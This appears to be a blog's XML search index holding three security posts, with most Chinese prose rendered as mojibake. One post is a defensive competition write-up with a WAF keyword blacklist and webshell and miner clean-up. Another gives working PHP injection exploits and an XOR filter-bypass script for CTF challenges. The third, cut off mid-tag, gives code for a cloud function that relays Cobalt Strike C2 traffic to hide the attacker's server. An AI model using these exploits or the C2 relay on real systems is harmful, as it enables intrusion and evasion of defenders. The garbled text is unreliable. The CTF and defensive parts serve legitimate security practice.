<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¹¿ä¸œçœå¼ºç½‘æ¯è¿ç»´èµ›éƒ¨åˆ†WP</title>
      <link href="2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
      <url>2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šå‘¨æœ«æ‰“äº†å¼ºç½‘æ¯ï¼ŒæŸèµ›é“æ‰“äº†ç¬¬ä¸‰åæ‹¿äº†äºŒç­‰å¥–ï¼Œä¸Šåˆæ˜¯è¿ç»´èµ›ï¼Œä¸‹åˆæ˜¯awdã€‚<br>ä¸Šåˆçš„è¿ç»´èµ›å‡ºçš„è¿˜å¯ä»¥ï¼Œæˆ‘è§‰å¾—éš¾åº¦ç›¸å¯¹ä½ä¸€ç‚¹ï¼Œä¸€å…±12é“é¢˜ï¼Œåˆ°æœ€ååŸºæœ¬æœ‰ä¸€åŠçš„äººèƒ½åšå‡ºæ¥6-8é“å·¦å³ï¼Œæœ¬èµ›é“ç¬¬ä¸‰-å…«åå…¨éƒ¨æ˜¯8é“é¢˜ã€‚è¿™æ¬¡æ‹¿å¥–å¾—äºäº†æœ‰pwnğŸ‘´å»ä¿®é¢˜ï¼Œæˆ‘webåº”æ€¥å“åº”åšçš„ä¸å¦‚åˆ«äººå¤šã€‚</p><p>åæ§½ï¼šä¸‹åˆçš„AWDçº¯è„‘ç˜«ï¼Œå‚èµ›æ‰‹å†Œå†™çš„æ˜¯AWDPï¼Œèµ›åˆ¶ä»‹ç»åˆ™æ˜¯AWDã€‚ä¸ä¸€è‡´ä¹Ÿå°±ç®—äº†ï¼Œä¸‹åˆAWDåªç»™ä¸€é“å·¨éš¾çš„pwnæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæœ€åæ”¾hintè¿expéƒ½å¿«æ”¾å®Œäº†ï¼Œæœ€ååªæœ‰é«˜æ ¡ç»„æœ‰1-2æ”¯é˜Ÿä¼åœ¨æ‰“ï¼Œå…¶ä»–èµ›é“å…¨åœ¨ç½šåã€‚</p><h1 id="webè¿ç»´"><a href="#webè¿ç»´" class="headerlink" title="webè¿ç»´"></a>webè¿ç»´</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>æœ‰ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„é¡µé¢ï¼Œå¤§ä½“æ„æ€å°±æ˜¯ä¼ å…¥å‚æ•°ä¹‹åååºåˆ—åŒ–è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé¢˜ç›®æœ¬èº«ç»™äº†wafï¼Œåªä¸è¿‡å…³é”®è¯æ¯”è¾ƒå°‘ã€‚å¦‚ blacklist=â€™\php|flag|system|&#39;;è‡ªå·±åŠ ä¸€äº›å…³é”®å­—å°±å¥½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\:\/\/|file\:\/\/|fread|create\_function|php|script|\&lt;\?php|\&#x27;|\&quot;|\(|\)|\&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$query</span>))  <span class="comment">// å‡è®¾ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ˜¯ $query</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hack detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šåŠ äº†å‡ ä¸ªå…³é”®å­—è¿™é¢˜çš„checkå°±è¿‡äº†</p><h2 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h2><p> ls -all çœ‹äº†ä¸€ä¸‹æœ‰.2.phpï¼Œæˆ‘ç›´æ¥ rm -rf åˆ å®Œä¹‹åè¿™ä¸ªcheckç‚¹è¿˜æ˜¯æ²¡æœ‰è¿‡ï¼Œä¹‹ååˆllçœ‹äº†ä¸‹å‘ç°æ˜¯ä¸æ­»é©¬ã€‚<br> æ€ä¸æ­»é©¬æœ‰2ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ˜¯å†™è„šæœ¬æ— é™å¾ªç¯åˆ é™¤ï¼Œpythonæˆ–è€…shellæˆ–è€…phpè„šæœ¬éƒ½å¯ä»¥ï¼Œç¬¬äºŒç§æ˜¯é‡å¯php-fpmæœåŠ¡ã€‚è¿™æ¬¡ç»™çš„æƒé™æ¯”è¾ƒé«˜ï¼Œæ˜¯rootï¼Œå¯ä»¥ç›´æ¥é‡å¯ã€‚ä½†æ˜¯åœ¨å¤§éƒ¨åˆ†awdæ¯”èµ›ä¸­å¯èƒ½æ²¡æœ‰é‡å¯æœåŠ¡çš„æƒé™ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§æ€è·¯æ˜¯å¿…è¡Œçš„ã€‚<br> é™„è„šæœ¬<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rm -rf .3.php;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;remove success&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>ä¸Šä¼ ä¸Šå»ä¹‹åchmod u+x 1.sh ç„¶å nohup ./1.sh &amp;æŒ‚ç€è·‘å°±å¯ä»¥äº†ã€‚</p><h2 id="phpinfoä¿¡æ¯æ³„éœ²"><a href="#phpinfoä¿¡æ¯æ³„éœ²" class="headerlink" title="phpinfoä¿¡æ¯æ³„éœ²"></a>phpinfoä¿¡æ¯æ³„éœ²</h2><p>æ²¡å•¥å¥½è¯´çš„ï¼Œåˆ äº†å°±è¡Œã€‚</p><h2 id="åé—¨"><a href="#åé—¨" class="headerlink" title="åé—¨"></a>åé—¨</h2><p>æŠŠæºç æä¸‹æ¥æ”¾åˆ°Dç›¾æŸ¥æ€ï¼ŒæŸ¥åˆ°äº†åé—¨ï¼Œç›´æ¥åˆ æ‰å°±å¥½ï¼Œè¿˜æœ‰XXEï¼Œæ–‡ä»¶ä¹Ÿæ˜¯ç›´æ¥åˆ æ‰å°±å¥½ã€‚</p><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h2 id="æŒ–çŸ¿"><a href="#æŒ–çŸ¿" class="headerlink" title="æŒ–çŸ¿"></a>æŒ–çŸ¿</h2><p>webå°±é‚£ä¹ˆå‡ é“é¢˜æˆ‘æ˜¯å¦¹æƒ³åˆ°çš„ï¼Œæˆ‘ä»¥ä¸ºåé¢è¿˜ä¼šæ”¾é¢˜ï¼Œä¸“é—¨é—®äº†ä¸»åŠæ–¹ï¼Œä¸»åŠæ–¹è¯´ä¸€æ¬¡æ”¾å®Œï¼Œå¥½å§ï¼Œé‚£ä¼°è®¡æ˜¯è¦åœ¨å…¶ä»–åœ°æ–¹æ‰¾patchç‚¹äº†ã€‚topçœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªè¿›ç¨‹çš„cpuåˆ©ç”¨ç‡è¿‡é«˜ï¼Œåœ¨/home/ctf/mxxxç›®å½•ä¸‹ï¼ˆå…·ä½“ç›®å½•åç§°è®°ä¸æ¸…äº†ï¼‰æ˜¯ä¸€ä¸ªelfæ–‡ä»¶ï¼ŒåŒç›®å½•ä¸‹è¿˜æœ‰jsonçš„é…ç½®æ–‡ä»¶ï¼Œç›´è§‰å‘Šè¯‰æˆ‘æ˜¯æŒ–çŸ¿ã€‚æŒ–çŸ¿ç¨‹åºå¸¸åœ¨tmpç›®å½•å†™ç‚¹ä¸œè¥¿ï¼Œè¿™é‡Œçš„æ“ä½œå°±æ˜¯é¦–å…ˆå¹²æ‰æŒ–çŸ¿è¿›ç¨‹ï¼Œç„¶ååˆ æ‰æŒ–çŸ¿ç¨‹åºä»¥åŠtmpç›®å½•ä¸‹å¯¹åº”çš„å†…å®¹ï¼Œç„¶åæŸ¥çœ‹crontabé˜²æ­¢å†æ¬¡ä¸‹è½½ä¸è‡ªå¯åŠ¨ã€‚</p><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontabè¿™é¢˜æˆ‘åº”è¯¥æ˜¯å¦¹åšå‡ºæ¥ï¼Œå¼‚å¸¸ç‚¹æ˜¯ctfç”¨æˆ·çš„crontabï¼Œæˆ‘æ˜¯rootç”¨æˆ·ã€‚çœ‹äº† /var/spool/cron/crontabsæ²¡çœ‹åˆ°å•¥ä¸œè¥¿,å°±æ²¡åœ¨çœ‹ã€‚èµ›åå¸ˆå‚…è¯´äº†ä¸‹ crontab -user -l ä¹Ÿå¯ä»¥çœ‹æŒ‡å®šç”¨æˆ·çš„crontabã€‚ã€‚å­¦åˆ°äº†</p><h2 id="å¤–è¿socket"><a href="#å¤–è¿socket" class="headerlink" title="å¤–è¿socket"></a>å¤–è¿socket</h2><p>netstat -antlp ä¹‹åå‘ç°æœ‰å‘9999ç«¯å£å¤–è¿çš„è¡Œä¸ºï¼Œç„¶åps aux å’Œps ef ä¹‹åçœ‹åˆ°äº†å‘½ä»¤ç±»ä¼¼ sh -c python3 -c â€œ__import__(â€˜osâ€™).system(â€˜xxxxxxâ€™)â€ã€‚å¯ä»¥ç¡®å®šæ˜¯è¿™äº›è¿›ç¨‹å»ºç«‹äº†socketè¿æ¥ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å…·ä½“æ˜¯è°èµ·äº†è¿™äº›è¿›ç¨‹â€¦å°±å¾ˆæ— å¥ˆï¼Œæ€ä¹Ÿæ€ä¸æ‰ï¼Œè¿™é‡Œæˆ‘çš„å¤„ç†æ–¹æ³•æ˜¯æŠŠpython3çš„è½¯è¿æ¥ç»™å¹²æ‰äº†ã€‚å› ä¸ºé€šè¿‡è§‚å¯Ÿè¿›ç¨‹å‘ç°é™¤äº†è¿™äº›å¤–è¿çš„æ²¡æœ‰ç”¨py3èµ·çš„è¿›ç¨‹ã€‚è¿™é‡Œå…¶å®æ˜¯æœ‰ä¸ªsoæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œåé¢pwnçš„é˜Ÿå‹ä¿®å¤çš„ã€‚</p><h2 id="sshå…¬é’¥"><a href="#sshå…¬é’¥" class="headerlink" title="sshå…¬é’¥"></a>sshå…¬é’¥</h2><p>ssh å…å¯†ç™»å½•å­˜æ”¾çš„å…¬é’¥åœ¨~/.ssh/authorized_keysæ–‡ä»¶é‡Œé¢ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç§é’¥ç™»å½•ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸‰ä¸ªå…¬é’¥ï¼Œæˆ‘ä»¬åªä¿ç•™äº†æˆ‘ä»¬ç§é’¥å¯¹åº”çš„å…¬é’¥ï¼Œå…¶ä»–å…¬é’¥å…¨ç»™åˆ äº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡è¿ç»´èµ›ç›¸å¯¹åŸºç¡€ï¼Œå°±å½“æ¸©ä¹ ä¸€ä¸‹åº”æ€¥å“åº”äº†ã€‚æ¯•ç«Ÿåªæ­£ç»åšè¿‡ä¸€æ¬¡ï¼šï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤é“ç®€å•ctf-php-webé¢˜</title>
      <link href="2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/"/>
      <url>2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$attrid</span>) &amp;&amp; is_array(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = count(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.intval(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array(<span class="variable">$attrstr</span>);</span><br><span class="line">â€‹```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ³¨æ„ç‚¹ï¼šextractå¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œ<span class="keyword">eval</span>é‚£å¥è¯æ˜¯æŠŠå­—ç¬¦ä¸²æ•°ç»„æ ¼å¼è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚</span><br><span class="line">exp:</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=2%22);system(%27whoami%27);//&amp;attrid%5B0%5D=1">http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1</a><br><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=1&amp;attrid%5B0%5D=2&amp;attrstr=phpinfo()">http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo()</a>;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(&#39;0&#39;);</span><br><span class="line">$str1 &#x3D; $_GET[&#39;str1&#39;];</span><br><span class="line">$str2 &#x3D; $_GET[&#39;str2&#39;];</span><br><span class="line">function waf($str)</span><br><span class="line">&#123;</span><br><span class="line">$blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;;</span><br><span class="line">    if (preg_match($blacklist,$str))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return  true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HackMe($str1,$str2)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; &quot;&quot;;</span><br><span class="line">for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$array1[$i] &#x3D; $str1[$i];</span><br><span class="line">&#125;</span><br><span class="line">for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)</span><br><span class="line">&#123;</span><br><span class="line">$array2[$b] &#x3D; $str2[$b];</span><br><span class="line">&#125;</span><br><span class="line">for ($c&#x3D;0;$c &lt;count($array1);$c++)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; $str.($array1[$c] ^ $array2[$c]);</span><br><span class="line">&#125;</span><br><span class="line">if (strlen($str)&lt;&#x3D;30)</span><br><span class="line">&#123;</span><br><span class="line">if (waf($str))</span><br><span class="line">&#123;</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;nonono you are sooooooooo lang~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HackMe($str1,$str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¤ç°æ—¶æ²¡æœ‰waf.phpï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™éœ€è¦å»fuzzä¸‹è¿‡æ»¤äº†å“ªä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œç®€å•å†™äº†äº›wafçš„å®ç°ï¼Œç›´æ¥å†™åˆ°functioné‡Œé¢äº†ã€‚ç®€å•çš„å¼‚æˆ–ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ava_alpha=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">32</span>&lt;i <span class="keyword">and</span> i&lt;<span class="number">127</span>):</span><br><span class="line">        ava_alpha.append(<span class="built_in">chr</span>(i))</span><br><span class="line">target_str=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">res1=<span class="string">&quot;&quot;</span></span><br><span class="line">res2=<span class="string">&quot;&quot;</span></span><br><span class="line">blacklist=[<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Getoutofloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(target_str)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ava_alpha:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ava_alpha:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))==(target_str[k]) <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                    res1+=<span class="built_in">str</span>(i)</span><br><span class="line">                    res2+=<span class="built_in">str</span>(j)</span><br><span class="line">                    <span class="keyword">raise</span> Getoutofloop()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„å¼‚æˆ–ï¼Œå†™è„šæœ¬çš„æ—¶å€™æ³¨æ„å¦‚ä½•è·³å‡ºæ‰€æœ‰å¾ªç¯ï¼Œè¿™é‡Œç”¨åˆ°äº†raise exceptionï¼Œå¯ä»¥æ ¹æ®é»‘åå•ç»´æŠ¤blacklistä¿è¯ä¸ç”¨blacklisté‡Œé¢çš„å­—ç¬¦ç”Ÿæˆå¼‚æˆ–å­—ç¬¦ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike äº‘å‡½æ•°éšè—æœåŠ¡å™¨IP</title>
      <link href="2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/"/>
      <url>2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/</url>
      
        <content type="html"><![CDATA[<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q">https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q</a></p><p><a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨çº¢é˜ŸåŸºç¡€è®¾æ–½å»ºè®¾ä¸­ï¼Œä½¿ç”¨äº‘å‡½æ•°å¯éšè—çœŸå®C2çš„IPåœ°å€ï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼Œå…¶ä»–æ–¹æ³•åŒ…æ‹¬ä½†ä¸é™äºç‰¹å¾æ¶ˆé™¤ã€è¯ä¹¦ä¿®æ”¹ã€CDNã€åŸŸå‰ç½®ã€‚è¿™äº›æŠ€æœ¯ä¼šé™†ç»­å®ç°ã€‚</p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p>è…¾è®¯äº‘æ³¨å†Œäº‘å‡½æ•°</p><p>æ–°å»ºå‡½æ•°-è‡ªå®šä¹‰åˆ›å»ºå‡½æ•°</p><p><img src="http://cdn.polowong.top/image-20211015185512996.png" alt="image-20211015185512996"></p><p>Pythonæ¨¡æ¿ï¼Œpython3.6å³å¯ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©APIç½‘å…³è§¦å‘</p><p>åœ¨å‡½æ•°ä»£ç ä¸­å†™å…¥å¦‚ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    C2=<span class="string">&#x27;http://&#x27;</span> <span class="comment"># C2 IPåœ°å€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ HTTPã€HTTPS~ä¸‹è§’æ ‡~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é…ç½®APIç½‘å…³</p><p><img src="http://cdn.polowong.top/image-20211015185830062.png" alt="image-20211015185830062"></p><p>ç‰ˆæœ¬é€‰æ‹©LATESTï¼Œç‚¹è¿›å»è“è‰²çš„é“¾æ¥è¿›è¡ŒAPIé…ç½®ï¼Œè·¯å¾„æ”¹ä¸ºæ ¹ç›®å½•</p><p><img src="http://cdn.polowong.top/image-20211015185912831.png" alt="image-20211015185912831"></p><p><img src="http://cdn.polowong.top/image-20211015185921658.png" 